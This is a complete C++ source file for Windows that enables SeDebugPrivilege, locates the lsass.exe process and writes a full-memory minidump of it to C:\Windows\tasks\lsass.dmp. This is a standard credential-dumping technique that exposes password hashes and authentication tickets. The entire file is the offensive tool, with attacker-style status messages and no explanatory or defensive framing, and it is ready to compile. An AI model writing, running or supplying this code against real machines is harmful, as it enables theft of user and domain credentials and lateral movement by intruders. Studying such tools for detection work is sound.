#include <Windows.h>
#include <TlHelp32.h>
#include <DbgHelp.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "dbghelp.lib")

DWORD FindProcessIdByName(const WCHAR* processName) {
	HANDLE hToolhelp32Snapshot = nullptr;
	hToolhelp32Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hToolhelp32Snapshot == INVALID_HANDLE_VALUE) {
		printf("[-] CreateToolhelp32Snapshot failed with error: %lu\n", GetLastError());
		return EXIT_FAILURE;
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hToolhelp32Snapshot, &pe32)) {
		do {
			if (!wcscmp(pe32.szExeFile, processName)) {
				CloseHandle(hToolhelp32Snapshot);
				return pe32.th32ProcessID;
			}
		} while (Process32Next(hToolhelp32Snapshot, &pe32));
	}

	return 0;
}

BOOL EnablePrivilege(LPCTSTR lpPrivilegeName) {
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	LUID luid;
	BOOL res = true;
	if (!LookupPrivilegeValue(nullptr, lpPrivilegeName, &luid)) res = FALSE;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) res = FALSE;
	if (!AdjustTokenPrivileges(hToken, false, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, 0)) res = FALSE;
	wprintf(res ? L"[+] Successfully enable %ls :)\n" : L"[-] failed to enable %ls :(\n", lpPrivilegeName);
	return res;
}

BOOL CreateMiniDump() {
	bool dumped = false;
	DWORD lsassProcessId = FindProcessIdByName(L"lsass.exe");
	HANDLE lsassProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, false, lsassProcessId);
	HANDLE hLsassDumpFile = CreateFile(L"C:\\Windows\\tasks\\lsass.dmp", GENERIC_ALL, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (lsassProcessHandle && hLsassDumpFile != INVALID_HANDLE_VALUE) {
		dumped = MiniDumpWriteDump(lsassProcessHandle, lsassProcessId, hLsassDumpFile, MiniDumpWithFullMemory, nullptr, nullptr, nullptr);
		printf(dumped ? "[+] successfully dumped to lsaas.dmp :)\n" : "[-] failed to dump :(\n");
		CloseHandle(hLsassDumpFile);
		CloseHandle(lsassProcessHandle);
		printf("[+] dumped lsass.exe with PID %lu\n", lsassProcessId);
		if (dumped) {
			printf("[+] Dump file created successfully.\n");
		}
		else {
			printf("[-] Failed to create dump file. Error: %lu\n", GetLastError());
		}
	}
	return dumped;
}

int main(void) {

	if (!EnablePrivilege(SE_DEBUG_NAME)) return EXIT_FAILURE;
	if (!CreateMiniDump()) return EXIT_FAILURE;

	return EXIT_SUCCESS;
}